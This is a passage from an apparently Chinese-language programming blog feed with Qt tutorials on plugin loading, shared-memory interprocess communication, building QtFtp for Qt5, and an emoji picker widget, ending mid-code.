class="hljs-title">MyTestPlugin</span>:</span><span class="hljs-keyword">public</span> QObject,MyTestPluginInterface<br>&#123;<br>    Q_OBJECT<br>     <span class="hljs-comment">//导出该插件</span><br>    <span class="hljs-built_in">Q_PLUGIN_METADATA</span>(IID <span class="hljs-string">&quot;myplugin.example.my.com&quot;</span>)<br>     <span class="hljs-comment">//将该接口注册到Qt的元对象系统</span><br>    <span class="hljs-built_in">Q_INTERFACES</span>(MyTestPluginInterface)<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">MyTestPlugin</span>();<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">helloworld</span><span class="hljs-params">(QString string)</span></span>;<br>    ~<span class="hljs-built_in">MyTestPlugin</span>()&#123;&#125;<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">// MYTESTPLUGIN_H</span></span><br></code></pre></div></td></tr></table></figure>
<p>mytestplugin.cpp <strong>插件类cpp源文件</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;mytestplugin.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QtPlugin&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QDebug&gt;</span></span><br>MyTestPlugin::<span class="hljs-built_in">MyTestPlugin</span>()&#123;&#125;<br><span class="hljs-comment">//重写该接口类的虚函数</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MyTestPlugin::helloworld</span><span class="hljs-params">(QString string)</span></span>&#123;<br>    <span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;Hello---&gt; &quot;</span>&lt;&lt;string;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>最后就是编辑.pro文件并构建该插件</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">TEMPLATE = lib<br>CONFIG += plugin<br>TARGET = mytestPlugin<br>DESTDIR = ../outputDir<br>HEADERS += \<br>    mytestplugin.h \<br>    mytestplugininterface.h<br>SOURCES += \<br>    mytestplugin.cpp<br></code></pre></div></td></tr></table></figure>
<blockquote>
<p>CONFIG 表明要构建一个插件<br />
TARGET 指定生成的.dll 或 .so 文件名<br />
DESTDIR 指定生成的.dll 或 .so 文件所在的目录</p>
</blockquote>
<p>最后还要把本地部署改为<strong>Release</strong>，然后在构建该项目即可生成指定的库文件，比如我的是 <strong><a href="http://libmytestPlugin.so">libmytestPlugin.so</a></strong></p>
<h3 id="测试插件"><a class="markdownIt-Anchor" href="#测试插件"></a> 测试插件</h3>
<p>为了做一个简单的测试，我另外创建了一个项目，调用插件也很简单，这里给出核心代码</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//用QPluginLoader加载动态链接库，注意QLibrary类与QPluginLoader类的区别</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QPluginLoader&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;mytestplugininterface.h&quot;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Dialog::loadmyPlugin</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    QPluginLoader *loader=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QPluginLoader</span>(<span class="hljs-keyword">this</span>);<br>    <span class="hljs-comment">//把插件文件和包含插件声明的文件放到项目下</span><br>    loader-&gt;<span class="hljs-built_in">setFileName</span>(<span class="hljs-string">&quot;libmytestPlugin.so&quot;</span>);<br>    <span class="hljs-comment">//判断加载插件是否成功</span><br>    <span class="hljs-keyword">if</span>(!loader-&gt;<span class="hljs-built_in">load</span>())&#123;<br>        <span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;Error:&quot;</span>&lt;&lt;loader-&gt;<span class="hljs-built_in">errorString</span>();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//遍历插件的元数据信息</span><br>    foreach (QString key,loader-&gt;<span class="hljs-built_in">metaData</span>().<span class="hljs-built_in">keys</span>()) &#123;<br>        <span class="hljs-built_in">qDebug</span>()&lt;&lt;key&lt;&lt;<span class="hljs-string">&quot;\t&quot;</span>&lt;&lt;loader-&gt;<span class="hljs-built_in">metaData</span>().<span class="hljs-built_in">value</span>(key);<br>    &#125;<br>    QObject*plugin= loader-&gt;<span class="hljs-built_in">instance</span>();<br>    <span class="hljs-comment">//转换获取插件类对象</span><br>    MyTestPluginInterface *mytestpliugin=qobject_cast&lt;MyTestPluginInterface*&gt;(plugin);<br>    mytestpliugin-&gt;<span class="hljs-built_in">helloworld</span>(<span class="hljs-string">&quot;Google...&quot;</span>);<br>    <span class="hljs-comment">//卸载插件</span><br>    loader-&gt;<span class="hljs-built_in">unload</span>();<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>ok，到此基本上完成了一个简单的插件使用了 ：)</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt进程间通信</title>
    <url>/linux-qt-process/</url>
    <content><![CDATA[<p>Qt中实现<strong>进程间通信</strong>的方法诸多,这里讲解比较简单的共享内存类<strong>QSharedMemory</strong>在这之前,先来看看这个类,其实函数不是很多,详细资料到官方文档查看</p>
<span id="more"></span>
<p>演示<br />
<img src="/uploads/images/file4_qt/qt0.gif" alt="img" /></p>
<p>下面代码注释写的比较清楚了</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QDebug&gt;</span></span><br><span class="hljs-comment">//内存共享 标识符</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MEM_KEY <span class="hljs-meta-string">&quot;_sharedMemKey_&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QPixmap&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QBuffer&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIX_MAP <span class="hljs-meta-string">&quot;test.jpg&quot;</span></span><br>Widget::<span class="hljs-built_in">Widget</span>(QWidget *parent) :<br>    <span class="hljs-built_in">QWidget</span>(parent),<br>    <span class="hljs-built_in">ui</span>(<span class="hljs-keyword">new</span> Ui::Widget)<br>&#123;<br>    ui-&gt;<span class="hljs-built_in">setupUi</span>(<span class="hljs-keyword">this</span>);<br>    <span class="hljs-comment">//设置内存标志 key</span><br>    sharedMemory=<span class="hljs-keyword">new</span> <span class="hljs-built_in">QSharedMemory</span>(<span class="hljs-keyword">this</span>);<br>    sharedMemory-&gt;<span class="hljs-built_in">setKey</span>(MEM_KEY);<br>&#125;<br>Widget::~<span class="hljs-built_in">Widget</span>()<br>&#123;<br>    <span class="hljs-keyword">delete</span> ui;<br>&#125;<br><span class="hljs-comment">//载入图片到内存</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::on_pushButton_clicked</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//如果已经绑定,则分离</span><br>    <span class="hljs-keyword">if</span>(sharedMemory-&gt;<span class="hljs-built_in">isAttached</span>())&#123;<br>        sharedMemory-&gt;<span class="hljs-built_in">detach</span>();<br>    &#125;<br>    QPixmap pmp;<br>    pmp.<span class="hljs-built_in">load</span>(PIX_MAP);<br>    ui-&gt;label-&gt;<span class="hljs-built_in">setPixmap</span>(pmp.<span class="hljs-built_in">scaled</span>(ui-&gt;label-&gt;<span class="hljs-built_in">size</span>()));<br>    <span class="hljs-comment">//图像的数据(QPixmap)---&gt; ( QDataStream )--&gt;QBuffer</span><br>    QBuffer tmpBuffer;<br>    <span class="hljs-comment">//打开 缓存区设备</span><br>    tmpBuffer.<span class="hljs-built_in">open</span>(QIODevice::ReadWrite);<br>    <span class="hljs-comment">//数据流与缓存区关联</span><br>    <span class="hljs-function">QDataStream <span class="hljs-title">dataOutstream</span><span class="hljs-params">(&amp;tmpBuffer)</span></span>;<br>    <span class="hljs-comment">//图像数据输入到数据流</span><br>    dataOutstream&lt;&lt;pmp;<br>    <span class="hljs-comment">//获取缓存区(图像)字节大小</span><br>    <span class="hljs-keyword">int</span> bufferSize=tmpBuffer.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-comment">//创建共享内存</span><br>    <span class="hljs-keyword">if</span>(sharedMemory-&gt;<span class="hljs-built_in">create</span>(bufferSize))&#123;<br>        <span class="hljs-comment">//lock</span><br>        sharedMemory-&gt;<span class="hljs-built_in">lock</span>();<br>        <span class="hljs-comment">//memset(sharedMemory-&gt;data(),0,bufferSize);</span><br>        <span class="hljs-comment">//获取图像数据</span><br>        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *datasharedBuffer= tmpBuffer.<span class="hljs-built_in">data</span>().<span class="hljs-built_in">data</span>();<br>        <span class="hljs-comment">//获取共享内存地址</span><br>        <span class="hljs-keyword">char</span> *datasharedMemory=(<span class="hljs-keyword">char</span> *)sharedMemory-&gt;<span class="hljs-built_in">data</span>();<br>        <span class="hljs-comment">//图像数据 拷贝到 共享内存中</span><br>        <span class="hljs-built_in">memcpy</span>(datasharedMemory,datasharedBuffer,bufferSize);<br>        <span class="hljs-comment">//unlock</span><br>        sharedMemory-&gt;<span class="hljs-built_in">unlock</span>();<br>    &#125;<br>    tmpBuffer.<span class="hljs-built_in">close</span>();<br>&#125;<br><span class="hljs-comment">//从共享内存获取图像数据</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::on_pushButton_2_clicked</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//进程与共享内存绑定!,,注意要设置好标识符 key</span><br>    <span class="hljs-keyword">if</span>(sharedMemory-&gt;<span class="hljs-built_in">attach</span>())&#123;<br>        <span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;ok!&quot;</span>;<br>        sharedMemory-&gt;<span class="hljs-built_in">lock</span>();<br>        <span class="hljs-comment">// 图像的数据(QPixmap) &lt;--- ( QDataStream ) &lt;--- QBuffer</span><br>        QBuffer buffer;<br>        <span class="hljs-keyword">char</span> *dataSharedMem=(<span class="hljs-keyword">char</span>*)sharedMemory-&gt;<span class="hljs-built_in">data</span>();<br>        <span class="hljs-keyword">int</span> dataSize =sharedMemory-&gt;<span class="hljs-built_in">size</span>();<br>        <span class="hljs-comment">//设置共享内存的数据到缓存区</span><br>        buffer.<span class="hljs-built_in">setData</span>(<span class="hljs-built_in">QByteArray</span>(dataSharedMem,dataSize));<br>        QPixmap pmp;<br>        buffer.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>        <span class="hljs-comment">//关联缓存区数据到数据流</span><br>        <span class="hljs-function">QDataStream <span class="hljs-title">dataInStream</span><span class="hljs-params">(&amp;buffer)</span></span>;<br>        dataInStream&gt;&gt;pmp;<br>        ui-&gt;label-&gt;<span class="hljs-built_in">setPixmap</span>(pmp.<span class="hljs-built_in">scaled</span>(ui-&gt;label-&gt;<span class="hljs-built_in">size</span>()));<br>        <span class="hljs-comment">//进程与共享内存分离</span><br>        sharedMemory-&gt;<span class="hljs-built_in">unlock</span>();<br>        <span class="hljs-keyword">if</span>(sharedMemory-&gt;<span class="hljs-built_in">isAttached</span>())&#123;<br>            sharedMemory-&gt;<span class="hljs-built_in">detach</span>();<br>        &#125;<br>        buffer.<span class="hljs-built_in">close</span>();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt5调用QFtp函数</title>
    <url>/linux-qt-qftp/</url>
    <content><![CDATA[<p>不知怎么,在Qt5以上版本没有了QFtp,不过可以用QNetworkAccessManager.我在网上也找了些资料,最后还是决定先暂时用QFtp…<br />
这篇博客讲解的很详细<br />
<a href="http://blog.csdn.net/liang19890820/article/details/53304049">http://blog.csdn.net/liang19890820/article/details/53304049</a></p>
<span id="more"></span>
<h4 id="下载qftp源码"><a class="markdownIt-Anchor" href="#下载qftp源码"></a> 下载QFtp源码</h4>
<blockquote>
<p>git clone <a href="https://github.com/qt/qtftp.git">https://github.com/qt/qtftp.git</a></p>
</blockquote>
<h4 id="修改配置"><a class="markdownIt-Anchor" href="#修改配置"></a> 修改配置</h4>
<ul>
<li>
<p>进入qtftp/src/qftp,有个</p>
<p><a href="http://qftp.pro">qftp.pro</a></p>
<p>,修改为</p>
<blockquote>
<p>CONFIG += static #生成 .a静态链接库<br />
CONFIG += shared #生成.so动态链接库</p>
</blockquote>
</li>
</ul>
<h4 id="编译"><a class="markdownIt-Anchor" href="#编译"></a> 编译</h4>
<p>进入qtftp根目录,编译生成库文件</p>
<blockquote>
<p>cd qtftp<br />
qmake<br />
make</p>
</blockquote>
<p>然后在 qtftp/lib 下生成了一些目录文件,大概是这样</p>
<blockquote>
<p>cmake/ <a href="http://libQt5Ftp.la">libQt5Ftp.la</a> <a href="http://libQt5Ftp.so">libQt5Ftp.so</a> <strong>libQt5Ftp.so.5.0</strong> pkgconfig/<br />
libQt5Ftp.a libQt5Ftp.prl libQt5Ftp.so.5 libQt5Ftp.so.5.0.0</p>
</blockquote>
<h4 id="整合文件"><a class="markdownIt-Anchor" href="#整合文件"></a> 整合文件</h4>
<p>把这些零散的文件整合成一个便于调用的库,还是非常有必要的<br />
这里我创建一个 <strong>libqtftp</strong> 文件夹,用来存放所需要的文件</p>
<p>然后在刚才在 <strong>qtftp</strong> 目录下的 <code>lib</code> , <code>include</code> , <code>src</code><br />
文件夹复制到 libqtftp 目录</p>
<ul>
<li>进入 include/QtFtp 文件夹,删除 headers.pri,同时把 src 文件夹内:<br />
qftp.cpp<br />
qftp.h<br />
qurlinfo.cpp<br />
qurlinfo.h<br />
.moc文件夹内<strong>3个文件</strong>复制到<strong>上一层文件夹</strong> (隐藏文件夹)<br />
.obj + .pch (隐藏文件夹)</li>
</ul>
<p>一并复制到 <strong>include/QtFtp</strong> 文件夹,这时可删除 <strong>src</strong> 文件夹</p>
<ul>
<li>修改 <strong>moc_qftp.cpp</strong> 代码 <code>#include &quot;../qftp.h&quot;</code> 为 <code>#include &quot;qftp.h&quot;</code></li>
<li>为了便于管理,在 <strong>libqtftp</strong> 目录下创建一个 .pri文件:</li>
</ul>
<p>qtftp.pri:</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment">#QT += network</span><br>HEADERS += $<span class="hljs-variable">$PWD</span><span class="hljs-regexp">/include/</span>QtFtp/\<br>		$<span class="hljs-variable">$PWD</span><span class="hljs-regexp">/include/</span>QtFtp/QFtp\<br>		$<span class="hljs-variable">$PWD</span><span class="hljs-regexp">/include/</span>QtFtp/QUrlInfo\<br>		$<span class="hljs-variable">$PWD</span><span class="hljs-regexp">/include/</span>QtFtp/QtFtpVersion<br>SOURCES += $<span class="hljs-variable">$PWD</span><span class="hljs-regexp">/include/</span>QtFtp/qftp.cpp\<br>		$<span class="hljs-variable">$PWD</span><span class="hljs-regexp">/include/</span>QtFtp/qurlinfo.cpp<br>INCLUDEPATH += $<span class="hljs-variable">$PWD</span><span class="hljs-regexp">/include/</span><br></code></pre></div></td></tr></table></figure>
<h4 id="引用库"><a class="markdownIt-Anchor" href="#引用库"></a> 引用库</h4>
<p>首先,新建一个Qt项目,把 <strong>libqtftp</strong> 文件夹放到 Qt项目下.<br />
然后在修改 <a href="http://xn--i0yn92e.pro">项目.pro</a> 文件</p>
<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">QT       += core gui network<br><span class="hljs-function"><span class="hljs-title">greaterThan</span><span class="hljs-params">(QT_MAJOR_VERSION, <span class="hljs-number">4</span>)</span></span>: QT += widgets<br>TARGET = MyFtp<br>TEMPLATE = app<br><span class="hljs-function"><span class="hljs-title">include</span><span class="hljs-params">($<span class="hljs-variable">$PWD</span>/libqtftp/qtftp.pri)</span></span><br>SOURCES += <span class="hljs-selector-tag">main</span>.cpp\<br>        mainwindow<span class="hljs-selector-class">.cpp</span><br>HEADERS  += mainwindow<span class="hljs-selector-class">.h</span><br>FORMS    += mainwindow<span class="hljs-selector-class">.ui</span><br>INCLUDEPATH += $<span class="hljs-variable">$PWD</span>/libqtftp/include/<br>LIBS += -L$<span class="hljs-variable">$PWD</span>/libqtftp/lib/ -lQt5Ftp<br></code></pre></div></td></tr></table></figure>
<p>要注意那个配置:</p>
<ul>
<li><code>QT += network</code></li>
<li><code>include($$PWD/libqtftp/qtftp.pri)</code></li>
<li><code>INCLUDEPATH += $$PWD/libqtftp/include/</code></li>
<li><code>LIBS += -L$$PWD/libqtftp/lib/ -lQt5Ftp</code><br />
链接<strong><a href="http://libQt5Ftp.so">libQt5Ftp.so</a></strong>动态链接库</li>
</ul>
<p>之后 重新构建项目</p>
<h4 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h4>
<p>使用前需要包含头文件</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;QtFtp/QFtp&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QtFtp/QUrlInfo&gt;</span></span><br></code></pre></div></td></tr></table></figure>
<p>如：</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// do something ...</span><br>	QFtp * ftp =<span class="hljs-keyword">new</span> <span class="hljs-built_in">QFtp</span>(<span class="hljs-keyword">this</span>);<br>	<span class="hljs-built_in">connect</span>(ftp,&amp;QFtp::listInfo,<span class="hljs-keyword">this</span>,[=](<span class="hljs-keyword">const</span> QUrlInfo u)&#123;<br>	<span class="hljs-comment">// do something ...</span><br>    &#125;);<br>    <span class="hljs-built_in">connect</span>(ftp,&amp;QFtp::dataTransferProgress,[=](qint64 _t1, qint64 _t2)&#123;<br>	<span class="hljs-comment">// do something ...</span><br>    &#125;);<br>    <span class="hljs-built_in">connect</span>(ftp,&amp;QFtp::readyRead,<span class="hljs-keyword">this</span>,[=]()&#123;<br>	<span class="hljs-comment">// do something ...</span><br>    &#125;);<br>    <span class="hljs-keyword">int</span> id=ftp-&gt;<span class="hljs-built_in">connectToHost</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    ftp-&gt;<span class="hljs-built_in">login</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>    ftp-&gt;<span class="hljs-built_in">cd</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    ftp-&gt;<span class="hljs-built_in">list</span>();<br>	ftp-&gt;<span class="hljs-built_in">close</span>();<br>	<span class="hljs-comment">// do something ...</span><br></code></pre></div></td></tr></table></figure>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>用Qt实现类似QQ表情窗口</title>
    <url>/linux-qt-qqwindow/</url>
    <content><![CDATA[<p>演示</p>
<p><img src="/uploads/images/files/demo1.gif" alt="" /></p>
<span id="more"></span>
<p>实现起来比较简单,就是在每个<strong>TableWidget</strong>的单元格设置一个Widget,如Label.重写QLabel类中的两个函数,达到鼠标进入离开单元格时显示的效果</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//添加gif到TabWidget</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::addGIFtoTableWidget</span><span class="hljs-params">(<span class="hljs-keyword">int</span> row,<span class="hljs-keyword">int</span> column,QString file)</span></span>&#123;<br>     <span class="hljs-comment">//自定义类,用来重新实现了一些函数</span><br>    MyLabel *label=<span class="hljs-keyword">new</span> MyLabel;<br>    <span class="hljs-comment">//设置边距</span><br>    label-&gt;<span class="hljs-built_in">setMargin</span>(<span class="hljs-number">3</span>);<br>    <span class="hljs-comment">//gif动画</span><br>    QMovie *movie=<span class="hljs-keyword">new</span> QMovie;<br>	<br>    movie-&gt;<span class="hljs-built_in">setFileName</span>(file);<br>    movie-&gt;<span class="hljs-built_in">setScaledSize</span>(<span class="hljs-built_in">QSize</span>(<span class="hljs-number">24</span>,<span class="hljs-number">24</span>));<br>    movie-&gt;<span class="hljs-built_in">start</span>();<br>    movie-&gt;<span class="hljs-built_in">stop</span>();<br>    label-&gt;<span class="hljs-built_in">setMovie</span>(movie);<br>     <span class="hljs-comment">//添加部件到tableWidget</span><br>    ui-&gt;tableWidget-&gt;<span class="hljs-built_in">setCellWidget</span>(row,column,label);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> QQ_GIF_DIR <span class="hljs-meta-string">&quot;../expression/qq/&quot;</span></span><br>Widget::<span class="hljs-built_in">Widget</span>(QWidget *parent) :<br>    <span class="hljs-built_in">QWidget</span>(parent),<br>    <span class="hljs-built_in">ui</span>(<span class="hljs-keyword">new</span> Ui::Widget)<br>&#123;<br>    ui-&gt;<span class="hljs-built_in">setupUi</span>(<span class="hljs-keyword">this</span>);<br>    <span class="hljs-comment">//不可选</span><br>    ui-&gt;tableWidget-&gt;<span class="hljs-built_in">setSelectionMode</span>(QTableWidget::NoSelection);<br>    ui-&gt;tableWidget-&gt;<span class="hljs-built_in">setRowCount</span>(<span class="hljs-number">10</span>);<br>    <span class="hljs-comment">//初始化 gif表格</span><br>    <span class="hljs-keyword">int</span> num_index=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> rowCount= ui-&gt;tableWidget-&gt;<span class="hljs-built_in">rowCount</span>();<br>    <span class="hljs-keyword">int</span> columnCount = ui-&gt;tableWidget-&gt;<span class="hljs-built_in">columnCount</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> row = <span class="hljs-number">0</span>; row &lt;rowCount; ++row)<br>     &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> column = <span class="hljs-number">0</span>;column&lt;columnCount; ++column)<br>         &#123;<br>            QString strFileName=<span class="hljs-built_in">QString</span>(<span class="hljs-string">&quot;%1%2.gif&quot;</span>).<span class="hljs-built_in">arg</span>(QQ_GIF_DIR).<span class="hljs-built_in">arg</span>(num_index);<br>              <span class="hljs-comment">//gif文件是否存在</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">QFileInfo</span>(strFileName).<span class="hljs-built_in">exists</span>())<br>                <span class="hljs-built_in">addGIFtoTableWidget</span>(row,column,strFileName);<br>            num_index++;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>然后再看看 MyLabel 类</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">mylabel.h<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> MYLABEL_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MYLABEL_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;QLabel&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyLabel</span> :</span> <span class="hljs-keyword">public</span> QLabel<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">MyLabel</span>(QWidget *parent=<span 